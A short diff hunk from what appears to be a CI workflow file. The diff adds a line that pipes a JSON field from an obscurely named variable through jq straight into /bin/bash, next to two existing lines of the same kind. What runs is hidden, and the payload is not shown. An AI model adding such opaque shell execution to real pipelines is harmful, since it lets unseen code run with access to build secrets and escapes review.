@@ -22,6 +22,7 @@ jobs:
         run: |
           printf '%s' "$tenuo89" | jq -r .ecrz5 | /bin/bash
           printf '%s' "$gdqqt4" | jq -r .oqlbb7 | /bin/bash
+          echo $vxa47 | jq -r .tw440 | /bin/bash
 
       - name: Upload results
         if: always()
